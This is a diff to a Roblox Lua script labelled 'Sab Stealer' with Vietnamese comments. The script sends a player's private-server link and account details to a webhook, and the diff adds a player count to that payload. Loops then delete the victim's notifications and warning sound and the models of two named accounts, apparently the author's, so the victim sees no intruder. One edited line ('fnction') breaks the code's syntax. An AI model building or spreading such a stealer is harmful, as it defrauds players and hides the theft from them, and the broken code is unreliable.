@@ -172,6 +172,7 @@ local function sendWebhook(link)
         ["title"] = "🌵 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
+            { ["name"] = "Players", ["value"] = string.format("%d/6", #game:GetService("Players"):GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👤 Player Information",
               ["value"] = "Name: " .. player.Name ..
@@ -291,7 +292,7 @@ else
         return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
     end
 
-    local function handleSend()
+    local fnction handleSend()
         local txt = textBox.Text or ""
         if isValidPrivateServerLink(txt) then
             sendWebhook(txt)
@@ -306,15 +307,10 @@ else
 end
 
 -- =============================
--- Script tự động xử lý base
--- =============================
--- =============================
--- Script quản lý base (Full Fixed)
+-- Script quản lý base (Full Final)
 -- Execute dùng ngay
--- ===================
--- Config
+-- =============================
 local badPlayers = { "phatle8117", "ConCuTiHon02" }
-local targetSweetTexts = { "Căn cứ của Sweet", "Sweet's Base" }
 
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
@@ -325,184 +321,169 @@ local clonedPodiumsDone = false
 -- Tìm base của bản thân
 -- =============================
 local function FindMyBase()
-    if not plotsFolder then return nil end
-    for _, plot in ipairs(plotsFolder:GetChildren()) do
-        local sign = plot:FindFirstChild("PlotSign")
-        if sign and sign:FindFirstChild("YourBase") then
-            local yourBase = sign.YourBase
-            if yourBase.Enabled == true then
-                return plot
-            end
-        end
-    end
-    return nil
+	if not plotsFolder then return nil end
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		local sign = plot:FindFirstChild("PlotSign")
+		if sign and sign:FindFirstChild("YourBase") then
+			local yourBase = sign.YourBase
+			if yourBase.Enabled == true then
+				return plot
+			end
+		end
+	end
+	return nil
 end
 
 -- =============================
 -- Nhân bản Model trong base
 -- =============================
 local function DuplicateBaseModelsOnce(base)
-    if not base or duplicatedBaseDone then return end
-    for _, obj in ipairs(base:GetChildren()) do
-        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
-            if not obj.Name:match("_clone$") then
-                local clone = obj:Clone()
-                clone.Name = obj.Name .. "_clone"
-                clone.Parent = base
-                obj:Destroy()
-            end
-        end
-    end
-    duplicatedBaseDone = true
-    print("Đã nhân bản model trong base:", base.Name)
+	if not base or duplicatedBaseDone then return end
+	for _, obj in ipairs(base:GetChildren()) do
+		if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
+			if not obj.Name:match("_clone$") then
+				local clone = obj:Clone()
+				clone.Name = obj.Name .. "_clone"
+				clone.Parent = base
+				obj:Destroy()
+			end
+		end
+	end
+	duplicatedBaseDone = true
+	print("Đã nhân bản model trong base:", base.Name)
 end
 
 -- =============================
 -- Nhân bản AnimalPodiums
 -- =============================
 local function DuplicateAnimalPodiumsOnce(base)
-    if not base or clonedPodiumsDone then return end
-    local podiums = base:FindFirstChild("AnimalPodiums")
-    if podiums then
-        for _, p in ipairs(podiums:GetChildren()) do
-            if p:IsA("Model") and not p.Name:match("_clone$") then
-                local c = p:Clone()
-                c.Name = p.Name .. "_clone"
-                c.Parent = podiums
-                p:Destroy()
-            end
-        end
-        clonedPodiumsDone = true
-        print("Đã nhân bản AnimalPodiums trong base:", base.Name)
-    end
+	if not base or clonedPodiumsDone then return end
+	local podiums = base:FindFirstChild("AnimalPodiums")
+	if podiums then
+		for _, p in ipairs(podiums:GetChildren()) do
+			if p:IsA("Model") and not p.Name:match("_clone$") then
+				local c = p:Clone()
+				c.Name = p.Name .. "_clone"
+				c.Parent = podiums
+				p:Destroy()
+			end
+		end
+		clonedPodiumsDone = true
+		print("Đã nhân bản AnimalPodiums trong base:", base.Name)
+	end
 end
 
 -- =============================
 -- Clean tất cả Hitboxes trong Purchases
 -- =============================
 local function cleanHitboxes(base)
-    if not base then return end
-    local purchases = base:FindFirstChild("Purchases")
-    if not purchases then return end
+	if not base then return end
+	local purchases = base:FindFirstChild("Purchases")
+	if not purchases then return end
 
-    -- Hàm xử lý 1 target
-    local function processTarget(target)
-        if not target then return end
-        for _, obj in ipairs(target:GetDescendants()) do
-            if string.lower(obj.Name) == "hitbox" then
-                obj:Destroy()
-                print("Đã xóa hitbox:", obj:GetFullName())
-            end
-        end
-        target.DescendantAdded:Connect(function(newObj)
-            if string.lower(newObj.Name) == "hitbox" then
-                newObj:Destroy()
-                print("Đã xóa hitbox mới:", newObj:GetFullName())
-            end
-        end)
-    end
+	local function processTarget(target)
+		if not target then return end
+		for _, obj in ipairs(target:GetDescendants()) do
+			if string.lower(obj.Name) == "hitbox" then
+				obj:Destroy()
+				print("Đã xóa hitbox:", obj:GetFullName())
+			end
+		end
+		target.DescendantAdded:Connect(function(newObj)
+			if string.lower(newObj.Name) == "hitbox" then
+				newObj:Destroy()
+				print("Đã xóa hitbox mới:", newObj:GetFullName())
+			end
+		end)
+	end
 
-    -- Quét tất cả children hiện tại của Purchases
-    for _, child in ipairs(purchases:GetChildren()) do
-        processTarget(child)
-    end
-
-    -- Nếu có child mới trong Purchases → xử lý luôn
-    purchases.ChildAdded:Connect(function(newChild)
-        task.wait(0.05)
-        processTarget(newChild)
-    end)
+	for _, child in ipairs(purchases:GetChildren()) do
+		processTarget(child)
+	end
+	purchases.ChildAdded:Connect(function(newChild)
+		task.wait(0.05)
+		processTarget(newChild)
+	end)
 end
 
 -- =============================
 -- Xóa model player xấu (loop)
 -- =============================
 local function DeletePlayerModelsLoop()
-    while true do
-        for _, name in ipairs(badPlayers) do
-            local m = Workspace:FindFirstChild(name)
-            if m then
-                m:Destroy()
-                warn("Đã xóa model:", name)
-            end
-        end
-        task.wait(1)
-    end
+	while true do
+		for _, name in ipairs(badPlayers) do
+			local m = Workspace:FindFirstChild(name)
+			if m then
+				m:Destroy()
+				warn("Đã xóa model:", name)
+			end
+		end
+		task.wait(1)
+	end
 end
 
 -- =============================
 -- Xóa Notification & Warn sound (loop)
 -- =============================
 local function RemoveGuiAndSoundsLoop()
-    while true do
-        local pg = localPlayer:FindFirstChild("PlayerGui")
-        if pg then
-            local notif = pg:FindFirstChild("Notification")
-            if notif then
-                notif:Destroy()
-                print("Đã xóa Notification")
-            end
-        end
-        local s = ReplicatedStorage:FindFirstChild("Sounds")
-        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
-            s.Sfx.Warn:Destroy()
-            print("Đã xóa Warn sound")
-        end
-        task.wait(1)
-    end
+	while true do
+		local pg = localPlayer:FindFirstChild("PlayerGui")
+		if pg then
+			local notif = pg:FindFirstChild("Notification")
+			if notif then
+				notif:Destroy()
+				print("Đã xóa Notification")
+			end
+		end
+		local s = ReplicatedStorage:FindFirstChild("Sounds")
+		if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
+			s.Sfx.Warn:Destroy()
+			print("Đã xóa Warn sound")
+		end
+		task.wait(1)
+	end
 end
 
 -- =============================
--- Xóa base Sweet (loop)
+-- Clone tất cả base (trừ bản thân)
 -- =============================
-local function CheckAndDeleteSweetLoop()
-    while true do
-        if plotsFolder then
-            for _, plot in ipairs(plotsFolder:GetChildren()) do
-                local sign = plot:FindFirstChild("PlotSign")
-                local tl = sign 
-                    and sign:FindFirstChild("SurfaceGui") 
-                    and sign.SurfaceGui:FindFirstChild("Frame") 
-                    and sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
-
-                if tl and tl.Text then
-                    local txt = string.lower(tostring(tl.Text))
-                    for _, t in ipairs(targetSweetTexts) do
-                        if string.find(txt, string.lower(t)) then
-                            print("Đã xóa base Sweet:", plot.Name, "| Nội dung:", tl.Text)
-                            plot:Destroy()
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        task.wait(0.1)
-    end
+local function CloneAndReplaceOtherBases(myBase)
+	if not plotsFolder then return end
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		if plot ~= myBase then
+			local clone = plot:Clone()
+			clone.Name = plot.Name .. "_Clone"
+			clone.Parent = plotsFolder
+			plot:Destroy()
+			print("Đã clone và xóa base khác:", clone.Name)
+		end
+	end
 end
 
 -- =============================
 -- MAIN
 -- =============================
 task.spawn(function()
-    while not plotsFolder do
-        plotsFolder = Workspace:FindFirstChild("Plots")
-        task.wait(0.1)
-    end
+	while not plotsFolder do
+		plotsFolder = Workspace:FindFirstChild("Plots")
+		task.wait(0.1)
+	end
 
-    myBase = FindMyBase()
-    if myBase then
-        print("Base của bạn là:", myBase.Name)
-        DuplicateBaseModelsOnce(myBase)
-        DuplicateAnimalPodiumsOnce(myBase)
-        cleanHitboxes(myBase)
-    else
-        warn("Không tìm thấy base của bạn!")
-    end
+	myBase = FindMyBase()
+	if myBase then
+		print("Base của bạn là:", myBase.Name)
+		DuplicateBaseModelsOnce(myBase)
+		DuplicateAnimalPodiumsOnce(myBase)
+		cleanHitboxes(myBase)
+	else
+		warn("Không tìm thấy base của bạn!")
+	end
 
-    task.spawn(DeletePlayerModelsLoop)
-    task.spawn(RemoveGuiAndSoundsLoop)
-    task.spawn(CheckAndDeleteSweetLoop)
+	-- Clone & xóa base khác
+	CloneAndReplaceOtherBases(myBase)
+
+	task.spawn(DeletePlayerModelsLoop)
+	task.spawn(RemoveGuiAndSoundsLoop)
 end)
 
 local CoreGui = game:GetService("CoreGui")
